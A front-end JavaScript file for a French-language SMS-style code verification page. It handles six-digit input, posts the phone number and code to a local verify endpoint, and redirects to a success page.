const API_VERIFY = '/api/verify-code';

function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
}

const phone = getParam('phone') || '--';
document.getElementById('codePhone').textContent = phone;

// Gestion des 6 chiffres
const inputs = document.querySelectorAll('.code-digit');

inputs.forEach((input, index) => {
    input.addEventListener('input', (e) => {
        const val = e.target.value.replace(/\D/g, '');
        e.target.value = val;
        if (val && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace' && !e.target.value && index > 0) {
            inputs[index - 1].focus();
        }
        if (e.key === 'Enter') {
            verifyCode();
        }
    });

    input.addEventListener('paste', (e) => {
        e.preventDefault();
        const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
        for (let i = 0; i < paste.length && i < inputs.length; i++) {
            inputs[i].value = paste[i];
        }
        const nextIdx = Math.min(paste.length, inputs.length - 1);
        inputs[nextIdx].focus();
    });
});

async function verifyCode() {
    const btn = document.getElementById('verifyBtn');
    const status = document.getElementById('codeStatus');

    let code = '';
    inputs.forEach(inp => code += inp.value);

    if (code.length !== 6) {
        status.textContent = '⚠️ Veuillez entrer les 6 chiffres';
        status.className = 'status-message error';
        return;
    }

    btn.classList.add('loading');
    btn.disabled = true;
    status.textContent = '';

    try {
        const res = await fetch(API_VERIFY, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ phone, code })
        });

        const data = await res.json();

        if (res.ok && data.success) {
            status.textContent = '✅ Code vérifié avec succès !';
            status.className = 'status-message success';
            setTimeout(() => {
                window.location.href = `success.html?phone=${encodeURIComponent(phone)}`;
            }, 1500);
        } else {
            status.textContent = data.message || '❌ Code incorrect';
            status.className = 'status-message error';
            inputs.forEach(i => { i.value = ''; i.classList.add('shake'); });
            setTimeout(() => inputs.forEach(i => i.classList.remove('shake')), 500);
            inputs[0].focus();
        }
    } catch (e) {
        status.textContent = '❌ Erreur réseau, réessayez';
        status.className = 'status-message error';
    } finally {
        btn.classList.remove('loading');
        btn.disabled = false;
    }
}

function requestNewCode() {
    const status = document.getElementById('codeStatus');
    status.textContent = '⏳ Nouveau code demandé au staff...';
    status.className = 'status-message success';
}

window.verifyCode = verifyCode;
window.requestNewCode = requestNewCode;
